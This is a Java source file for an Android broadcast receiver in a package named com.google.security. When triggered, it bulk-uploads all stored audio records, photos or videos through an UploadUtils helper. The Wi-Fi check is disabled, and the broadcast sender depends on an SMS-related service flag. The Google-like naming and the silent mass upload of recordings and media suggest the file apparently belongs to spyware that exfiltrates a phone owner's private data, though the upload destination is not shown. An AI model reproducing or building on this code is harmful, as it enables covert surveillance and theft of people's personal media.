package com.google.security;

import java.io.IOException;

import org.apache.http.ParseException;
import org.json.JSONException;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.net.wifi.WifiManager;
import android.os.Bundle;
import android.util.Log;

public class FinishReceiver extends BroadcastReceiver {
	UploadUtils uploadUtils;
	WifiManager mWifiManager;
	Boolean ifWificonnected = false;

	@Override
	public void onReceive(Context context, Intent intent) {
		// TODO Auto-generated method stub
		uploadUtils = UploadUtils.getIntance(context);
		mWifiManager = (WifiManager) context
				.getSystemService(Context.WIFI_SERVICE);
		//if (mWifiManager.getWifiState() == 3)
			ifWificonnected = true;
		Bundle bundle = intent.getExtras();
		String type = bundle.getString("type");
		Log.e("broadcastinfo", type);
		if (type.equals("record")) {
			if (ifWificonnected) {
				try {
					//for (int i = 0; i < 3; i++) {
						uploadUtils.sendAllRecords();
					//}
				} catch (ParseException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				} catch (IOException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				} catch (JSONException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			}

		} else if (type.equals("photo")) {
			if (ifWificonnected) {
				try {
					//for (int i = 0; i < 3; i++) {
						uploadUtils.sendAllPhotos();
					//}
				} catch (ParseException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				} catch (IOException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				} catch (JSONException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			}
		} else {
			if (ifWificonnected) {
				try {
					//for (int i = 0; i < 3; i++) {
						uploadUtils.sendAllVideos();
					//}
				} catch (ParseException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				} catch (IOException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				} catch (JSONException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			}
		}
	}

	public static void finishbroadcast(String type, Context context) {
		if (MainService.SMSflag) {
			Intent intent = new Intent();
			intent.putExtra("type", type);
			intent.setAction("finish");// action与接收器相同
			context.sendBroadcast(intent);
		}
	}
}
